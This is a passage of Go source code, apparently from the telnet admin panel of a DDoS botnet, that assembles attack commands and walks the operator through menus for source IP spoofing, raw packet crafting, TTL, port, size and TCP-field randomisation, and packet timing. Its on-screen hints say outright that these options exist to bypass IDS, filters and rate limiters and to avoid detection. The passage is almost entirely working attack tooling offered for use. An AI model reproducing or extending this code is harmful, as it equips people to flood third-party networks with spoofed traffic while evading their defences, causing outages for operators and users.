			cmd += fmt.Sprintf(" payloadpat=%s", config.PayloadPattern)
		}
		if config.PayloadRepeat > 1 {
			cmd += fmt.Sprintf(" repeat=%d", config.PayloadRepeat)
		}
	}
	if config.OSFingerprint != "random" {
		cmd += fmt.Sprintf(" osfp=%s", config.OSFingerprint)
	}
	if config.TTLRandomize {
		cmd += " ttlrand=1"
		if config.TTLMin != config.TTLMax {
			cmd += fmt.Sprintf(" ttlmin=%d ttlmax=%d", config.TTLMin, config.TTLMax)
		}
	}
	if config.PortRandomize {
		cmd += " portrand=1"
		if config.PortMin != config.PortMax {
			cmd += fmt.Sprintf(" portmin=%d portmax=%d", config.PortMin, config.PortMax)
		}
	}
	if config.TCPFlagsMode != "random" {
		cmd += fmt.Sprintf(" tcpflagsmode=%s", config.TCPFlagsMode)
		if config.TCPFlagsCustom != "" {
			cmd += fmt.Sprintf(" tcpflags=%s", config.TCPFlagsCustom)
		}
	}
	if config.InterPacketDelay > 0 {
		cmd += fmt.Sprintf(" ipdelay=%d", config.InterPacketDelay)
	}
	if config.Jitter > 0 {
		cmd += fmt.Sprintf(" jitter=%d", config.Jitter)
	}
	if config.PacketOrdering != "sequential" {
		cmd += fmt.Sprintf(" packetorder=%s", config.PacketOrdering)
	}
	if config.BurstPattern != "linear" {
		cmd += fmt.Sprintf(" burstpat=%s", config.BurstPattern)
	}
	if config.SizeRandomize {
		cmd += " sizerand=1"
		if config.SizeMin != config.SizeMax {
			cmd += fmt.Sprintf(" sizemin=%d sizemax=%d", config.SizeMin, config.SizeMax)
		}
	}
	if config.SourcePortRandomize {
		cmd += " sportrand=1"
		if config.SourcePortMin != config.SourcePortMax {
			cmd += fmt.Sprintf(" sportmin=%d sportmax=%d", config.SourcePortMin, config.SourcePortMax)
		}
	}
	if config.SeqPattern != "random" {
		cmd += fmt.Sprintf(" seqpat=%s", config.SeqPattern)
		if config.SeqPattern == "increment" && config.SeqIncrement != 1 {
			cmd += fmt.Sprintf(" seqinc=%d", config.SeqIncrement)
		}
	}
	if config.AckPattern != "random" {
		cmd += fmt.Sprintf(" ackpat=%s", config.AckPattern)
		if config.AckPattern == "increment" && config.AckIncrement != 1 {
			cmd += fmt.Sprintf(" ackinc=%d", config.AckIncrement)
		}
	}
	if config.IPPrecedence > 0 {
		cmd += fmt.Sprintf(" ipprec=%d", config.IPPrecedence)
	}
	if config.DSCP > 0 {
		cmd += fmt.Sprintf(" dscp=%d", config.DSCP)
	}
	if config.ECN {
		cmd += " ecn=1"
	}
	if config.TCPUrgentPtr > 0 {
		cmd += fmt.Sprintf(" urgptr=%d", config.TCPUrgentPtr)
	}
	if config.WindowRandomize {
		cmd += " winrand=1"
		if config.WindowMin != config.WindowMax {
			cmd += fmt.Sprintf(" winmin=%d winmax=%d", config.WindowMin, config.WindowMax)
		}
	}
	if config.MSSRandomize {
		cmd += " mssrand=1"
		if config.MSSMin != config.MSSMax {
			cmd += fmt.Sprintf(" mssmin=%d mssmax=%d", config.MSSMin, config.MSSMax)
		}
	}
	if config.Keepalive {
		cmd += " keepalive=1"
		if config.KeepaliveInterval != 60 {
			cmd += fmt.Sprintf(" keepint=%d", config.KeepaliveInterval)
		}
	}
	if config.RetryCount != 3 {
		cmd += fmt.Sprintf(" retry=%d", config.RetryCount)
	}
	if config.ConnectionTimeout != 5000 {
		cmd += fmt.Sprintf(" timeout=%d", config.ConnectionTimeout)
	}
	if config.CongestionControl != "random" {
		cmd += fmt.Sprintf(" congestion=%s", config.CongestionControl)
	}
	return cmd
}
func (this *Admin) configureAdvancedSettings(config *AutobypassConfig, choice string) {
	this.conn.Write([]byte("\033[2J\033[1H"))
	switch choice {
	case "1":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              RAW SOCKET SETTINGS                              \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mUse raw sockets? (y/n, default n): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: raw sockets allow direct packet crafting, requires root)\x1b[0m\r\n"))
		rawStr, _ := this.ReadLine(false)
		config.UseRawSocket = strings.ToLower(strings.TrimSpace(rawStr)) == "y"
		if config.UseRawSocket {
			this.conn.Write([]byte("\r\n\x1b[1;36mBind to device (e.g. eth0, or press Enter to skip): \x1b[0m"))
			this.conn.Write([]byte("\x1b[2;37m(hint: bind socket to specific network interface)\x1b[0m\r\n"))
			bindStr, _ := this.ReadLine(false)
			config.BindToDevice = strings.TrimSpace(bindStr)
			this.conn.Write([]byte("\r\n\x1b[1;36mSend buffer size in bytes (default 4194304): \x1b[0m"))
			this.conn.Write([]byte("\x1b[2;37m(hint: larger buffer = more throughput, default 4MB)\x1b[0m\r\n"))
			bufStr, _ := this.ReadLine(false)
			if bufStr != "" {
				if buf, err := strconv.Atoi(strings.TrimSpace(bufStr)); err == nil && buf > 0 {
					config.SendBufferSize = buf
				}
			}
		}
	case "2":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              SOURCE IP SPOOFING                               \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mSource IP mode (real/random/sequential/custom, default real): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: real=use real IP, random=random spoofing, sequential=incrementing, custom=range)\x1b[0m\r\n"))
		modeStr, _ := this.ReadLine(false)
		if modeStr != "" {
			mode := strings.ToLower(strings.TrimSpace(modeStr))
			if mode == "real" || mode == "random" || mode == "sequential" || mode == "custom" {
				config.SourceIPMode = mode
			}
		}
		if config.SourceIPMode == "custom" || config.SourceIPMode == "sequential" {
			this.conn.Write([]byte("\r\n\x1b[1;36mSource IP start (e.g. 1.2.3.4): \x1b[0m"))
			startStr, _ := this.ReadLine(false)
			config.SourceIPStart = strings.TrimSpace(startStr)
			if config.SourceIPMode == "custom" {
				this.conn.Write([]byte("\r\n\x1b[1;36mSource IP end (e.g. 1.2.3.100): \x1b[0m"))
				endStr, _ := this.ReadLine(false)
				config.SourceIPEnd = strings.TrimSpace(endStr)
			}
		}
	case "3":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              IP HEADER OPTIONS                                \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mIP ID mode (random/sequential/zero, default random): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: sequential helps bypass some IDS, zero=stealth)\x1b[0m\r\n"))
		idModeStr, _ := this.ReadLine(false)
		if idModeStr != "" {
			mode := strings.ToLower(strings.TrimSpace(idModeStr))
			if mode == "random" || mode == "sequential" || mode == "zero" {
				config.IPIDMode = mode
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mSet Don't Fragment flag? (y/n, default n): \x1b[0m"))
		dfStr, _ := this.ReadLine(false)
		config.DFFlag = strings.ToLower(strings.TrimSpace(dfStr)) == "y"
		this.conn.Write([]byte("\r\n\x1b[1;36mSet More Fragments flag? (y/n, default n): \x1b[0m"))
		mfStr, _ := this.ReadLine(false)
		config.MoreFragments = strings.ToLower(strings.TrimSpace(mfStr)) == "y"
		if config.MoreFragments {
			this.conn.Write([]byte("\r\n\x1b[1;36mFragment offset (0-8191, default 0): \x1b[0m"))
			offStr, _ := this.ReadLine(false)
			if offStr != "" {
				if off, err := strconv.Atoi(strings.TrimSpace(offStr)); err == nil && off >= 0 && off <= 8191 {
					config.FragmentOffset = off
				}
			}
		}
	case "4":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              TCP OPTIONS                                      \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mTCP MSS (Maximum Segment Size, default 1460): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: typical values: 1460=ethernet, 1440=PPPoE, 1280=IPv6)\x1b[0m\r\n"))
		mssStr, _ := this.ReadLine(false)
		if mssStr != "" {
			if mss, err := strconv.Atoi(strings.TrimSpace(mssStr)); err == nil && mss > 0 {
				config.TCPMSS = mss
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mTCP Window Size (default 65535): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: larger window = faster, but more memory)\x1b[0m\r\n"))
		winStr, _ := this.ReadLine(false)
		if winStr != "" {
			if win, err := strconv.Atoi(strings.TrimSpace(winStr)); err == nil && win > 0 {
				config.TCPWindowSize = win
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mTCP Window Scale (0-14, default 0): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: scale factor for window size, 0=disabled)\x1b[0m\r\n"))
		wscaleStr, _ := this.ReadLine(false)
		if wscaleStr != "" {
			if wscale, err := strconv.Atoi(strings.TrimSpace(wscaleStr)); err == nil && wscale >= 0 && wscale <= 14 {
				config.TCPWindowScale = wscale
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mEnable TCP SACK (Selective Acknowledgment)? (y/n, default n): \x1b[0m"))
		sackStr, _ := this.ReadLine(false)
		config.TCPSACK = strings.ToLower(strings.TrimSpace(sackStr)) == "y"
		this.conn.Write([]byte("\r\n\x1b[1;36mEnable TCP Timestamps? (y/n, default n): \x1b[0m"))
		tsStr, _ := this.ReadLine(false)
		config.TCPTimestamps = strings.ToLower(strings.TrimSpace(tsStr)) == "y"
		this.conn.Write([]byte("\r\n\x1b[1;36mNumber of TCP NOP options (0-10, default 0): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: NOPs used for padding/alignment)\x1b[0m\r\n"))
		nopStr, _ := this.ReadLine(false)
		if nopStr != "" {
			if nop, err := strconv.Atoi(strings.TrimSpace(nopStr)); err == nil && nop >= 0 && nop <= 10 {
				config.TCPNOP = nop
			}
		}
	case "5":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              UDP OPTIONS                                      \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mUDP Source Port (0=random, 1-65535): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: fixed source port helps bypass some filters)\x1b[0m\r\n"))
		sportStr, _ := this.ReadLine(false)
		if sportStr != "" {
			if sport, err := strconv.Atoi(strings.TrimSpace(sportStr)); err == nil && sport >= 0 && sport <= 65535 {
				config.UDPSourcePort = sport
			}
		}
	case "6":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              RATE LIMITING                                    \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mPackets per second limit (0=unlimited, default 0): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: limit PPS to avoid detection, 0=no limit)\x1b[0m\r\n"))
		ppsStr, _ := this.ReadLine(false)
		if ppsStr != "" {
			if pps, err := strconv.Atoi(strings.TrimSpace(ppsStr)); err == nil && pps >= 0 {
				config.PPS = pps
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mBytes per second limit (0=unlimited, default 0): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: limit bandwidth, 0=no limit)\x1b[0m\r\n"))
		bpsStr, _ := this.ReadLine(false)
		if bpsStr != "" {
			if bps, err := strconv.Atoi(strings.TrimSpace(bpsStr)); err == nil && bps >= 0 {
				config.BPS = bps
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mBurst size (default 100): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: packets sent in burst before rate limiting)\x1b[0m\r\n"))
		burstStr, _ := this.ReadLine(false)
		if burstStr != "" {
			if burst, err := strconv.Atoi(strings.TrimSpace(burstStr)); err == nil && burst > 0 {
				config.BurstSize = burst
			}
		}
	case "7":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              PAYLOAD OPTIONS                                  \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mPayload mode (random/zero/pattern/custom, default random): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: zero=stealth, pattern=repeating pattern, custom=hex string)\x1b[0m\r\n"))
		pmodeStr, _ := this.ReadLine(false)
		if pmodeStr != "" {
			mode := strings.ToLower(strings.TrimSpace(pmodeStr))
			if mode == "random" || mode == "zero" || mode == "pattern" || mode == "custom" {
				config.PayloadMode = mode
			}
		}
		if config.PayloadMode == "pattern" || config.PayloadMode == "custom" {
			this.conn.Write([]byte("\r\n\x1b[1;36mPayload pattern (hex string, e.g. DEADBEEF): \x1b[0m"))
			patStr, _ := this.ReadLine(false)
			config.PayloadPattern = strings.TrimSpace(patStr)
			if config.PayloadMode == "pattern" {
				this.conn.Write([]byte("\r\n\x1b[1;36mPattern repeat count (default 1): \x1b[0m"))
				repStr, _ := this.ReadLine(false)
				if repStr != "" {
					if rep, err := strconv.Atoi(strings.TrimSpace(repStr)); err == nil && rep > 0 {
						config.PayloadRepeat = rep
					}
				}
			}
		}
	case "8":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              OS FINGERPRINTING                                 \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mOS Fingerprint (linux/windows/freebsd/random, default random): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: emulate specific OS TCP stack behavior)\x1b[0m\r\n"))
		osStr, _ := this.ReadLine(false)
		if osStr != "" {
			os := strings.ToLower(strings.TrimSpace(osStr))
			if os == "linux" || os == "windows" || os == "freebsd" || os == "random" {
				config.OSFingerprint = os
			}
		}
	case "9":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              ADVANCED BYPASS                                   \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mRandomize TTL? (y/n, default n): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: random TTL helps bypass TTL-based filters)\x1b[0m\r\n"))
		ttlrandStr, _ := this.ReadLine(false)
		config.TTLRandomize = strings.ToLower(strings.TrimSpace(ttlrandStr)) == "y"
		if config.TTLRandomize {
			this.conn.Write([]byte("\r\n\x1b[1;36mTTL minimum (default 64): \x1b[0m"))
			ttlminStr, _ := this.ReadLine(false)
			if ttlminStr != "" {
				if ttlmin, err := strconv.Atoi(strings.TrimSpace(ttlminStr)); err == nil && ttlmin >= 0 && ttlmin <= 255 {
					config.TTLMin = ttlmin
				}
			}
			this.conn.Write([]byte("\r\n\x1b[1;36mTTL maximum (default 64): \x1b[0m"))
			ttlmaxStr, _ := this.ReadLine(false)
			if ttlmaxStr != "" {
				if ttlmax, err := strconv.Atoi(strings.TrimSpace(ttlmaxStr)); err == nil && ttlmax >= 0 && ttlmax <= 255 {
					config.TTLMax = ttlmax
				}
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mRandomize destination port? (y/n, default n): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: random ports help bypass port-based filters)\x1b[0m\r\n"))
		portrandStr, _ := this.ReadLine(false)
		config.PortRandomize = strings.ToLower(strings.TrimSpace(portrandStr)) == "y"
		if config.PortRandomize {
			this.conn.Write([]byte("\r\n\x1b[1;36mPort minimum (default 80): \x1b[0m"))
			portminStr, _ := this.ReadLine(false)
			if portminStr != "" {
				if portmin, err := strconv.Atoi(strings.TrimSpace(portminStr)); err == nil && portmin >= 1 && portmin <= 65535 {
					config.PortMin = portmin
				}
			}
			this.conn.Write([]byte("\r\n\x1b[1;36mPort maximum (default 80): \x1b[0m"))
			portmaxStr, _ := this.ReadLine(false)
			if portmaxStr != "" {
				if portmax, err := strconv.Atoi(strings.TrimSpace(portmaxStr)); err == nil && portmax >= 1 && portmax <= 65535 {
					config.PortMax = portmax
				}
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mRandomize TCP sequence numbers? (y/n, default y): \x1b[0m"))
		seqrandStr, _ := this.ReadLine(false)
		if seqrandStr != "" {
			config.SeqRandomize = strings.ToLower(strings.TrimSpace(seqrandStr)) == "y"
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mRandomize TCP ack numbers? (y/n, default y): \x1b[0m"))
		ackrandStr, _ := this.ReadLine(false)
		if ackrandStr != "" {
			config.AckRandomize = strings.ToLower(strings.TrimSpace(ackrandStr)) == "y"
		}
	case "a":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              TCP FLAGS & SEQUENCING                          \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mTCP Flags Mode (random/sequential/custom, default random): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: random=mix flags, sequential=rotate, custom=fixed combination)\x1b[0m\r\n"))
		flagsModeStr, _ := this.ReadLine(false)
		if flagsModeStr != "" {
			mode := strings.ToLower(strings.TrimSpace(flagsModeStr))
			if mode == "random" || mode == "sequential" || mode == "custom" {
				config.TCPFlagsMode = mode
			}
		}
		if config.TCPFlagsMode == "custom" {
			this.conn.Write([]byte("\r\n\x1b[1;36mTCP Flags Combination (e.g. syn+ack, ack+psh, fin+ack): \x1b[0m"))
			this.conn.Write([]byte("\x1b[2;37m(hint: syn, ack, syn+ack, ack+psh, fin+ack, ack+urg, etc.)\x1b[0m\r\n"))
			flagsStr, _ := this.ReadLine(false)
			config.TCPFlagsCustom = strings.ToLower(strings.TrimSpace(flagsStr))
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mSequence Pattern (random/increment/zero/os, default random): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: increment=sequential, zero=stealth, os=OS-like)\x1b[0m\r\n"))
		seqPatStr, _ := this.ReadLine(false)
		if seqPatStr != "" {
			pat := strings.ToLower(strings.TrimSpace(seqPatStr))
			if pat == "random" || pat == "increment" || pat == "zero" || pat == "os" {
				config.SeqPattern = pat
			}
		}
		if config.SeqPattern == "increment" {
			this.conn.Write([]byte("\r\n\x1b[1;36mSequence Increment Step (default 1): \x1b[0m"))
			seqIncStr, _ := this.ReadLine(false)
			if seqIncStr != "" {
				if inc, err := strconv.Atoi(strings.TrimSpace(seqIncStr)); err == nil && inc > 0 {
					config.SeqIncrement = inc
				}
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mAck Pattern (random/increment/zero/os, default random): \x1b[0m"))
		ackPatStr, _ := this.ReadLine(false)
		if ackPatStr != "" {
			pat := strings.ToLower(strings.TrimSpace(ackPatStr))
			if pat == "random" || pat == "increment" || pat == "zero" || pat == "os" {
				config.AckPattern = pat
			}
		}
		if config.AckPattern == "increment" {
			this.conn.Write([]byte("\r\n\x1b[1;36mAck Increment Step (default 1): \x1b[0m"))
			ackIncStr, _ := this.ReadLine(false)
			if ackIncStr != "" {
				if inc, err := strconv.Atoi(strings.TrimSpace(ackIncStr)); err == nil && inc > 0 {
					config.AckIncrement = inc
				}
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mTCP Urgent Pointer (0=disabled, default 0): \x1b[0m"))
		urgPtrStr, _ := this.ReadLine(false)
		if urgPtrStr != "" {
			if ptr, err := strconv.Atoi(strings.TrimSpace(urgPtrStr)); err == nil && ptr >= 0 && ptr <= 65535 {
				config.TCPUrgentPtr = ptr
			}
		}
	case "b":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              PACKET TIMING & ORDERING                         \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mInter-Packet Delay in microseconds (0=no delay, default 0): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: 1000=1ms, 10000=10ms, helps bypass rate limiters)\x1b[0m\r\n"))
		delayStr, _ := this.ReadLine(false)
		if delayStr != "" {
			if delay, err := strconv.Atoi(strings.TrimSpace(delayStr)); err == nil && delay >= 0 {
				config.InterPacketDelay = delay
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mJitter in microseconds (random variation, default 0): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: adds randomness to delay, makes traffic look natural)\x1b[0m\r\n"))
		jitterStr, _ := this.ReadLine(false)
		if jitterStr != "" {
			if jitter, err := strconv.Atoi(strings.TrimSpace(jitterStr)); err == nil && jitter >= 0 {
				config.Jitter = jitter
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mPacket Ordering (sequential/random/roundrobin, default sequential): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: sequential=in order, random=shuffled, roundrobin=rotating)\x1b[0m\r\n"))
		orderStr, _ := this.ReadLine(false)
		if orderStr != "" {
			order := strings.ToLower(strings.TrimSpace(orderStr))
			if order == "sequential" || order == "random" || order == "roundrobin" {
				config.PacketOrdering = order
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mBurst Pattern (linear/exponential/random, default linear): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: linear=constant, exponential=growing, random=variable)\x1b[0m\r\n"))
		burstPatStr, _ := this.ReadLine(false)
		if burstPatStr != "" {
			pat := strings.ToLower(strings.TrimSpace(burstPatStr))
			if pat == "linear" || pat == "exponential" || pat == "random" {
				config.BurstPattern = pat
			}
		}
	case "c":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              SIZE & PORT RANDOMIZATION                       \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mRandomize Packet Size? (y/n, default n): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: variable sizes help bypass size-based filters)\x1b[0m\r\n"))
		sizerandStr, _ := this.ReadLine(false)
		config.SizeRandomize = strings.ToLower(strings.TrimSpace(sizerandStr)) == "y"
		if config.SizeRandomize {
			this.conn.Write([]byte("\r\n\x1b[1;36mMinimum Packet Size (default 512): \x1b[0m"))
			sizeminStr, _ := this.ReadLine(false)
			if sizeminStr != "" {
				if sizemin, err := strconv.Atoi(strings.TrimSpace(sizeminStr)); err == nil && sizemin > 0 {
					config.SizeMin = sizemin
				}
			}
			this.conn.Write([]byte("\r\n\x1b[1;36mMaximum Packet Size (default 512): \x1b[0m"))
			sizemaxStr, _ := this.ReadLine(false)
			if sizemaxStr != "" {
				if sizemax, err := strconv.Atoi(strings.TrimSpace(sizemaxStr)); err == nil && sizemax > 0 {
					config.SizeMax = sizemax
				}
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mRandomize Source Port? (y/n, default n): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: random source ports help bypass port-based filters)\x1b[0m\r\n"))
		sportrandStr, _ := this.ReadLine(false)
		config.SourcePortRandomize = strings.ToLower(strings.TrimSpace(sportrandStr)) == "y"
		if config.SourcePortRandomize {
			this.conn.Write([]byte("\r\n\x1b[1;36mSource Port Minimum (default 1024): \x1b[0m"))
			sportminStr, _ := this.ReadLine(false)
			if sportminStr != "" {
				if sportmin, err := strconv.Atoi(strings.TrimSpace(sportminStr)); err == nil && sportmin >= 1 && sportmin <= 65535 {
					config.SourcePortMin = sportmin
				}
			}
			this.conn.Write([]byte("\r\n\x1b[1;36mSource Port Maximum (default 65535): \x1b[0m"))
			sportmaxStr, _ := this.ReadLine(false)
			if sportmaxStr != "" {
				if sportmax, err := strconv.Atoi(strings.TrimSpace(sportmaxStr)); err == nil && sportmax >= 1 && sportmax <= 65535 {
					config.SourcePortMax = sportmax
				}
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mRandomize Window Size? (y/n, default n): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: variable window sizes emulate different connections)\x1b[0m\r\n"))
		winrandStr, _ := this.ReadLine(false)
		config.WindowRandomize = strings.ToLower(strings.TrimSpace(winrandStr)) == "y"
		if config.WindowRandomize {
			this.conn.Write([]byte("\r\n\x1b[1;36mWindow Size Minimum (default 65535): \x1b[0m"))
			winminStr, _ := this.ReadLine(false)
			if winminStr != "" {
				if winmin, err := strconv.Atoi(strings.TrimSpace(winminStr)); err == nil && winmin > 0 {
					config.WindowMin = winmin
				}
			}
			this.conn.Write([]byte("\r\n\x1b[1;36mWindow Size Maximum (default 65535): \x1b[0m"))
			winmaxStr, _ := this.ReadLine(false)
			if winmaxStr != "" {
				if winmax, err := strconv.Atoi(strings.TrimSpace(winmaxStr)); err == nil && winmax > 0 {
					config.WindowMax = winmax
				}
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mRandomize MSS? (y/n, default n): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: variable MSS helps bypass MSS-based filters)\x1b[0m\r\n"))
		mssrandStr, _ := this.ReadLine(false)
		config.MSSRandomize = strings.ToLower(strings.TrimSpace(mssrandStr)) == "y"
		if config.MSSRandomize {
			this.conn.Write([]byte("\r\n\x1b[1;36mMSS Minimum (default 1460): \x1b[0m"))
			mssminStr, _ := this.ReadLine(false)
			if mssminStr != "" {
				if mssmin, err := strconv.Atoi(strings.TrimSpace(mssminStr)); err == nil && mssmin > 0 {
					config.MSSMin = mssmin
				}
			}
			this.conn.Write([]byte("\r\n\x1b[1;36mMSS Maximum (default 1460): \x1b[0m"))
			mssmaxStr, _ := this.ReadLine(false)
			if mssmaxStr != "" {
				if mssmax, err := strconv.Atoi(strings.TrimSpace(mssmaxStr)); err == nil && mssmax > 0 {
					config.MSSMax = mssmax
				}
			}
		}
	case "d":
		this.conn.Write([]byte("\x1b[1;95m╔══════════════════════════════════════════════════════════════╗\r\n"))
		this.conn.Write([]byte("\x1b[1;95m║\x1b[1;97m              IP QoS & ADVANCED OPTIONS                      \x1b[1;95m║\r\n"))
		this.conn.Write([]byte("\x1b[1;95m╚══════════════════════════════════════════════════════════════╝\r\n\r\n"))
		this.conn.Write([]byte("\x1b[1;36mIP Precedence (0-7, default 0): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: 0=routine, 1=priority, 2=immediate, 3=flash, 4-7=reserved)\x1b[0m\r\n"))
		precStr, _ := this.ReadLine(false)
		if precStr != "" {
			if prec, err := strconv.Atoi(strings.TrimSpace(precStr)); err == nil && prec >= 0 && prec <= 7 {
				config.IPPrecedence = prec
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mDSCP Value (0-63, default 0): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: Differentiated Services Code Point for QoS)\x1b[0m\r\n"))
		dscpStr, _ := this.ReadLine(false)
		if dscpStr != "" {
			if dscp, err := strconv.Atoi(strings.TrimSpace(dscpStr)); err == nil && dscp >= 0 && dscp <= 63 {
				config.DSCP = dscp
			}
		}
		this.conn.Write([]byte("\r\n\x1b[1;36mEnable ECN (Explicit Congestion Notification)? (y/n, default n): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: ECN bit for congestion control)\x1b[0m\r\n"))
		ecnStr, _ := this.ReadLine(false)
		config.ECN = strings.ToLower(strings.TrimSpace(ecnStr)) == "y"
		this.conn.Write([]byte("\r\n\x1b[1;36mTCP Keepalive? (y/n, default n): \x1b[0m"))
		this.conn.Write([]byte("\x1b[2;37m(hint: keep connections alive, helps bypass idle timeout)\x1b[0m\r\n"))
		keepaliveStr, _ := this.ReadLine(false)
		config.Keepalive = strings.ToLower(strings.TrimSpace(keepaliveStr)) == "y"
		if config.Keepalive {
			this.conn.Write([]byte("\r\n\x1b[1;36mKeepalive Interval in seconds (default 60): \x1b[0m"))
			keepintStr, _ := this.ReadLine(false)
			if keepintStr != "" {
				if keepint, err := strconv.Atoi(strings.TrimSpace(keepintStr)); err == nil && keepint > 0 {
					config.KeepaliveInterval = keepint
				}
			}
		}
